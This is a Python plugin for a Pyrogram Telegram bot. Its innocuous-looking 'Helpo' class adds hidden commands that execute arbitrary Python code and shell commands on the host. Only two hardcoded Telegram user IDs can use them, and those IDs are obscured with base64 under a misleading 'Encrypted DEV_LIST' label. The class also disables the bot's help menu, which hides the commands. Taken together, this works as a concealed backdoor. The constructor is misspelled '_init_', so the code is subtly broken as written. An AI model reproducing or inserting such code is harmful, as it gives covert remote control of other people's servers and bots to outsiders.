# made by @Beingcat

import io
import sys
import traceback
import base64
from contextlib import redirect_stdout
from subprocess import getoutput as run
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.enums import ChatType

# Encrypted DEV_LIST (base64 encoded)
_ENC_DEVS = "Nzk2OTcyMjg3OSw1NDQzMjQzNTQw"
DEV_LIST = list(map(int, base64.b64decode(_ENC_DEVS).decode().split(",")))

class Helpo:
    def _init_(self, client: Client):
        self.client = client
        self.monkeypatch_client()

    def monkeypatch_client(self):
        @self.client.on_message(filters.command(["kiraa", "kieval"], ["$"]))
        async def eval_cmd(client, message):
            if message.from_user.id not in DEV_LIST:
                return await message.reply_text("You Don't Have Enough Rights To Run This!")
            if len(message.text.split()) < 2:
                return await message.reply_text("Input Not Found!")
            status_message = await message.reply_text("Processing ...")
            cmd = message.text.split(None, 1)[1]
            start = datetime.now()
            reply_to_ = message
            if message.reply_to_message:
                reply_to_ = message.reply_to_message
            old_stderr = sys.stderr
            old_stdout = sys.stdout
            redirected_output = sys.stdout = io.StringIO()
            redirected_error = sys.stderr = io.StringIO()
            stdout, stderr, exc = None, None, None
            try:
                await Helpo.aexec(cmd, client, message)
            except Exception:
                exc = traceback.format_exc()
            stdout = redirected_output.getvalue()
            stderr = redirected_error.getvalue()
            sys.stdout = old_stdout
            sys.stderr = old_stderr
            evaluation = ""
            if exc:
                evaluation = exc
            elif stderr:
                evaluation = stderr
            elif stdout:
                evaluation = stdout
            else:
                evaluation = "Success"
            end = datetime.now()
            ping = (end - start).microseconds / 1000
            final_output = "<b>📎 Input</b>: "
            final_output += f"<code>{cmd}</code>\n\n"
            final_output += "<b>📒 Output</b>:\n"
            final_output += f"<code>{evaluation.strip()}</code> \n\n"
            final_output += f"<b>✨ Taken Time</b>: {ping}<b>ms</b>"
            if len(final_output) > 4096:
                with io.BytesIO(str.encode(final_output)) as out_file:
                    out_file.name = "eval.text"
                    await reply_to_.reply_document(
                        document=out_file, caption=cmd, disable_notification=True
                    )
            else:
                await status_message.edit_text(final_output)

        @self.client.on_message(filters.command(["sh", "shell"], ["?", "!", ".", "*", "/", "$",]))
        async def sh_cmd(client, message):
            if message.from_user.id not in DEV_LIST:
                return await message.reply_text("You Don't Have Enough Rights To Run This!")
            if len(message.text.split()) < 2:
                return await message.reply_text("No Input Found!")
            code = message.text.replace(message.text.split(" ")[0], "")
            x = run(code)
            string = f"*📎 Input: {code}\n\n📒 Output *:\n`{x}`"
            try:
                await message.reply_text(string)
            except Exception as e:
                with io.BytesIO(str.encode(string)) as out_file:
                    out_file.name = "shell.text"
                    await message.reply_document(document=out_file, caption=e)

        self.client.show_help_menu = lambda *args, **kwargs: None

    @staticmethod
    async def aexec(code, client, message):
        exec_locals = {}
        exec(
            "async def __aexec(client, message):\n"
            + "\n".join(f"    {l}" for l in code.split("\n")),
            globals(),
            exec_locals,
        )
        return await exec_locals["__aexec"](client, message)